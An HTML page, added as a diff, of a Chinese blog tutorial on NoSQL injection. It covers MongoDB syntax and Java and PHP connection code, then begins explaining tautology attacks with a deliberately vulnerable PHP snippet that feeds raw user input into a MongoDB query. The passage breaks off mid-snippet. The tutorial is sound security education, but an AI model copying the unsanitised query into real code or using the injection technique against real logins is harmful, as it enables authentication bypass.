@@ -1,0 +1,1497 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="nosql注入浅析, Atmujie">
+    <meta name="description" content="有一美人兮，见之不忘，一日不见兮，思之如狂；">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>nosql注入浅析 | Atmujie</title>
+    <link rel="icon" type="image/png" href="/weblogo.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Atmujie</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Atmujie</div>
+        <div class="logo-desc">
+            
+            有一美人兮，见之不忘，一日不见兮，思之如狂；
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">nosql注入浅析</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">Web安全</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-11-08
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Nosql并不特定的指某个数据库，而是泛指非关联型数据库</p>
+<p>+++</p>
+<p><img src="image-20211108160038156.png" alt="image-20211108160038156"></p>
+<p>+++</p>
+<h2 id="关系型数据库和非关系型数据库"><a href="#关系型数据库和非关系型数据库" class="headerlink" title="关系型数据库和非关系型数据库"></a>关系型数据库和非关系型数据库</h2><p>关系型数据库，是指采用了关系模型来组织数据的数据库。</p>
+<p>简单来说就是以二维表格模型及其之前的联系组成的数据库</p>
+<p><img src="image-20211108161150881.png" alt="image-20211108161150881"></p>
+<p>除开关系型，不以数据间联系组成的数据库，统称为非关系型，代表为MongoDB</p>
+<p><strong>非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合。</strong></p>
+<p>+++</p>
+<p><img src="image-20211108161321919.png" alt="image-20211108161321919"></p>
+<p><img src="image-20211108161357763.png" alt="image-20211108161357763"></p>
+<p>++++</p>
+<p>参考文章<code>https://www.jianshu.com/p/fd7b422d5f93</code></p>
+<p>nosql主要针对了非关系型数据库，其中代表主要为MongoDB和redis，所以需要学习这两个数据库的语法</p>
+<h1 id="MongoDB-基础语法"><a href="#MongoDB-基础语法" class="headerlink" title="MongoDB 基础语法"></a>MongoDB 基础语法</h1><h2 id="基础须知语法"><a href="#基础须知语法" class="headerlink" title="基础须知语法"></a>基础须知语法</h2><p>MongoDB是以文档的形式来储存数据的数据库，所以对MongoDB而言，数据库即为当前操作的文档，表即为该文档的数据集合，数据以键值对的形式储存在集合中。</p>
+<p><img src="image-20211108165230518.png" alt="image-20211108165230518"></p>
+<p><img src="image-20211108171310688.png" alt="image-20211108171310688"></p>
+<pre class="line-numbers language-mongo"><code class="language-mongo">db  - 显示当前数据库对象或集合/相当于mysql的 database();
+
+show dbs - 显示所有数据库 相当于 show databases;
+
+use 【库名】 - 数据库不存在，则创建数据库，否则切连接并换到指定数据库
+     属于mysql中use 和 create database 的二合一
+     use后的数据库并不会立即创建，而是在插入数据后才创建
+     如果没有指定数据库，会自动存放在默认的test数据库中
+     
+使用用户名和密码连接到 MongoDB 服务器，必须使用 'username:password@hostname/dbname' 格式
+    默认情况下直接mongo就可以
+    
+db.dropDatabase() - 删除数据库，使用该命令需要先用use指定数据库
+    use atmujie
+    db.dropDatabase()
+
+db.createCollection("集合名/表名",{ 参数【可选】}) - 创建集合/表
+    db.createCollection("mycol", { capped : true, autoIndexId : true, size : 6142800, max : 10000 } )
+    capped 如果为 true，则创建固定集合。固定集合是指有着固定大小的集合，当达到最大值时，它会自动覆盖最早的文档。
+    autoIndexId 3.2 之后不再支持该参数。（可选）如为 true，自动在 _id 字段创建索引。默认为 false。
+    size 为固定集合指定一个最大值，即字节数。如果 capped 为 true，也需要指定该字段。
+    max 指定固定集合中包含文档的最大数量。
+
+show collections - 查看当前表中的所有集合，这里支持使用show tables来查集合
+
+db.[集合名].drop() - 删除集合
+
+db.[集合名].insert({"key": "value"}) - 插入数据
+    同时mongo规定 save()插入数据
+    save()：如果 _id 主键存在则更新数据，如果不存在就插入数据。
+    该方法3.2版本中已废弃，可以使用 db.collection.insertOne() 或 db.collection.replaceOne() 来代替。
+    insert(): 若插入的数据主键已经存在，不保存当前数据。
+    insertOne和replaceOne具体用法见图1
+    
+db.[集合名].find() - 查看该表/集合下的所有数据，括号写条件可查询指定数据
+    db.col.find().pretty()方法以格式化的方式来显示所有文档。
+    见图二
+
+
+变量写入： document = ({
+                        .......
+                    });
+          db.[集合名].insert() //这可真方便开发
+          
+更新文档/行: db.[集合名].update(
+                {<query>},//update的查询条件，类似sql update查询内where后面的。
+                {<update>},//update的对象和一些更新的操作符（如$set,$inc...）等，也可以理解为sql update查询内set后面的
+                {
+                    upsert: <boolean>, 
+                    //可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。
+                    multi: <boolean>,
+                    //可选，mongo默认只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。
+                    writeConcern: <document>
+                    //可选，抛出异常的级别。
+                }
+            ) 
+    // 例： db.mujie.update({"name":"mujie"},{$set:{"age":"20"}})
+    
+更新全部： db.[集合名].save({"_id" : ...}) // 替换_id的全部内容
+
+db.[集合名].remove({条件}，{选项}) - 删除文档
+    db.[集合名].remove({}) - 删除全部 相当于mysql truncate 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="image-20211108183657190.png" alt="图一"></p>
+<p><img src="image-20211108195942133-16363727935411.png" alt="图二"></p>
+<h2 id="MongoDB查询语句详解"><a href="#MongoDB查询语句详解" class="headerlink" title="MongoDB查询语句详解"></a>MongoDB查询语句详解</h2><blockquote>
+<p><strong>语法：db.collection.find(query, projection)</strong></p>
+<ul>
+<li><strong>query</strong> ：可选，使用查询操作符指定查询条件</li>
+<li><strong>projection</strong> ：可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）。</li>
+</ul>
+</blockquote>
+<h3 id="查询操作符"><a href="#查询操作符" class="headerlink" title="查询操作符"></a>查询操作符</h3><p><img src="image-20211108202318760.png" alt="image-20211108202318760"></p>
+<pre class="line-numbers language-nosql"><code class="language-nosql">db.collections.find({
+    "key":"value", // 等于
+    "key":{$lt:"value"}, // 小于
+    "key":{$lte:"value"}, // 小于等于
+    "key":{$gt:"value"}, // 大于
+    "key":{$gte:"value"}, // 大于等于
+    "key":{$ne:"value"} // 不等于
+})
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="AND-条件"><a href="#AND-条件" class="headerlink" title="AND 条件"></a>AND 条件</h3><pre class="line-numbers language-mongo"><code class="language-mongo">db.collections.find(
+    {
+    "name":"atmujie",
+    "age":20
+    }
+)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>返回两者都满足的数据</p>
+<p>相当于<code>where name=&quot;mujie&quot; and age=20</code></p>
+<h3 id="OR语句"><a href="#OR语句" class="headerlink" title="OR语句"></a>OR语句</h3><pre class="line-numbers language-mongo"><code class="language-mongo">db.collections.find(
+    $or:[{"name":"mujie"},{"age":20}]
+)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>使用关键字$or</p>
+<p>相当于where name=”mujie” or age=20</p>
+<pre class="line-numbers language-mongo"><code class="language-mongo">// and or 联合使用
+db.collections.fond(
+    {"name":"mujie"},
+    $or:[{"age":20},{"age":"14"}]
+)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>相当于 where name=”mujie” and (age=20 or age=14)</p>
+<h3 id="type操作符"><a href="#type操作符" class="headerlink" title="$type操作符"></a>$type操作符</h3><p>$type基于类型来检索数据</p>
+<p>和大于小于等于一致，同属于操作符</p>
+<pre class="line-numbers language-mongo"><code class="language-mongo">db.mujie.find({"name":{$type:"string"}})
+// 查询key为name时的所有字符数据
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="image-20211108214457065.png" alt="image-20211108214457065"></p>
+<h3 id="Limit-方法与Skip-方法"><a href="#Limit-方法与Skip-方法" class="headerlink" title="Limit()方法与Skip()方法"></a>Limit()方法与Skip()方法</h3><p>同mysql的limit,mongodb中同样用limit指定显示的记录</p>
+<pre class="line-numbers language-mongo"><code class="language-mongo">db.mujie.find().limit(1)
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211108215101776.png" alt="image-20211108215101776"></p>
+<p>Skip()方法用于跳过指定量的数据</p>
+<pre class="line-numbers language-mongo"><code class="language-mongo">db.mujie.find().Skip(1)
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211108215319010.png" alt="image-20211108215319010"></p>
+<p>MongoDB中大多数命令可以联合使用</p>
+<h3 id="排序-sort-方法"><a href="#排序-sort-方法" class="headerlink" title="排序 sort()方法"></a>排序 sort()方法</h3><p>sort() 方法可以通过参数指定排序的字段，并使用 1 和 -1 来指定排序的方式，其中 1 为升序排列，而 -1 是用于降序排列。</p>
+<pre class="line-numbers language-mongo"><code class="language-mongo">db.collections.find().sort({KEY:1})
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="image-20211108220954222.png" alt="image-20211108220954222"></p>
+<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>+++</p>
+<p><img src="image-20211108221511871.png" alt="image-20211108221511871"></p>
+<p>+++</p>
+<pre class="line-numbers language-mongo"><code class="language-mongo">创建索引
+db.collections.createIndex({"key":1/-1})
+1 为指定按升序创建索引，-1 为降序
+db.mujie.totalSize("_id_")
+db.mujie.dropIndex("name_1")
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="image-20211109135439733-16364372884122.png" alt="image-20211109135439733"></p>
+<p>对于每一个集合（除了capped集合），默认会在_id字段上创建索引，而且这个特别的索引不能删除。_id字段是强制唯一的，由数据库维护。</p>
+<h2 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h2><p>用于处理数据(诸如统计平均值，求和等)，并返回计算后的数据结果。，类似 <strong>SQL</strong> 语句中的 **count(*)**。</p>
+<pre class="line-numbers language-mongo"><code class="language-mongo">db.col.aggregate(AGGREGATE_OPERATION)
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>++++</p>
+<blockquote>
+<p>管道</p>
+</blockquote>
+<p><img src="image-20211109153134414.png" alt="image-20211109153134414"></p>
+<blockquote>
+<p>操作</p>
+</blockquote>
+<p><img src="image-20211109152247966.png" alt="image-20211109152247966"></p>
+<p>+++</p>
+<pre class="line-numbers language-mongo"><code class="language-mongo">语法详解
+db.col.aggregate(
+    [{
+        $group:{
+            _id:"$name",
+            a:{    
+                $last:"$age"
+            },
+            b:{
+                $first:"$age"
+            }
+        }
+    }]
+)
+aggregate(
+    $管道符:{
+        _id:"$key1", // 必须，设定一个key为主键，按该值将数据分组
+        自定义key:{$操作符:"$key2"}, // 可选，将指定的key2进行操作符指示的处理后赋值给自定义的key
+        自定义key....
+    }
+)
+相当于mysql: select name,count([符合操作的数据]) form users group by name;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="image-20211109155105289.png" alt="image-20211109155105289"></p>
+<p>到这里nosql注入中MongoDB语法掌握的东西就差不多了</p>
+<p>起码注入不会有太多问题</p>
+<h1 id="编程语言连接MongoDB"><a href="#编程语言连接MongoDB" class="headerlink" title="编程语言连接MongoDB"></a>编程语言连接MongoDB</h1><h2 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h2><p>在java中使用MongoDB首先哟啊安装JDBC驱动</p>
+<p>其次导入mongo jar包</p>
+<pre class="line-numbers language-Maven"><code class="language-Maven"><!-- https://mvnrepository.com/artifact/org.mongodb/mongo-java-driver -->
+<dependency>
+    <groupId>org.mongodb</groupId>
+    <artifactId>mongo-java-driver</artifactId>
+    <version>3.12.10</version>
+</dependency>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//连接数据库</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>mongodb<span class="token punctuation">.</span>MongoClient<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>mongodb<span class="token punctuation">.</span>client<span class="token punctuation">.</span>MongoDatabase<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MongoDBJDBC</span><span class="token punctuation">{</span>
+   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> String args<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
+      <span class="token keyword">try</span><span class="token punctuation">{</span>   
+       <span class="token comment" spellcheck="true">// 连接到 mongodb 服务</span>
+         MongoClient mongoClient <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span> <span class="token string">"localhost"</span> <span class="token punctuation">,</span> <span class="token number">27017</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+       
+         <span class="token comment" spellcheck="true">// 连接到数据库</span>
+         MongoDatabase mongoDatabase <span class="token operator">=</span> mongoClient<span class="token punctuation">.</span><span class="token function">getDatabase</span><span class="token punctuation">(</span><span class="token string">"mycol"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+       System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Connect to database successfully"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        
+      <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        System<span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">}</span>
+   <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>安装MongoDB扩展看<code>https://www.runoob.com/mongodb/mongodb-install-php-driver.html</code></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// php7连接MongoDB</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">// 连接数据库</span>
+<span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"连接MongoDB失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// 插入数据【增】</span>
+<span class="token variable">$mongoInsert</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>BulkWrite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$mongoInsert</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"passwd"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"你问我我问谁"</span><span class="token punctuation">,</span><span class="token string">"emm"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"php7的MongoDB怎么和java有一拼"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$mongo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeBulkWrite</span><span class="token punctuation">(</span><span class="token string">'atmujie.mujie'</span><span class="token punctuation">,</span><span class="token variable">$mongoInsert</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// 删除数据【删】</span>
+<span class="token variable">$mongoDelete</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>BulkWrite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$mongoDelete</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"admin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"limit"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// limit为1删除匹配的第一条，为0删除配的全部，默认0</span>
+<span class="token variable">$mongo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeBulkWrite</span><span class="token punctuation">(</span><span class="token string">'atmujie.mujie'</span><span class="token punctuation">,</span><span class="token variable">$mongoDelete</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// 更新数据【改】</span>
+<span class="token variable">$mongoUpdate</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>BulkWrite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$mongoUpdate</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"admin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"age"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// update三个参数，name、age、选项</span>
+<span class="token variable">$mongo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeBulkWrite</span><span class="token punctuation">(</span><span class="token string">'atmujie.mujie'</span><span class="token punctuation">,</span><span class="token variable">$mongoUpdate</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token comment" spellcheck="true">// 查询数据【查】</span>
+<span class="token variable">$mongoQueery</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 查询条件,相当于find()方法,[]表示查询全部</span>
+<span class="token variable">$queryResult</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string">'atmujie.mujie'</span><span class="token punctuation">,</span><span class="token variable">$mongoQueery</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 执行查询</span>
+<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$queryResult</span> <span class="token keyword">as</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$json</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//    print_r($res); // 输出数据</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h1><p>nosql的本质就是注入，所以注入的方法和mysql并没有什么区别，只是语法不同所以注入的技巧不同</p>
+<h2 id="永真式"><a href="#永真式" class="headerlink" title="永真式"></a>永真式</h2><p>其他文章也叫他重言式，我感觉永真顺口，就叫永真了</p>
+<p>简单来说就是传入条件判断符，使查询条件永远伪真</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">const</span> <span class="token constant">TEXT</span> <span class="token operator">=</span> <span class="token string">'atmujie.mujie'</span><span class="token punctuation">;</span>
+<span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+$这是用户输入 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"username"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"admin"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span>$这是用户输入<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token constant">TEXT</span><span class="token punctuation">,</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
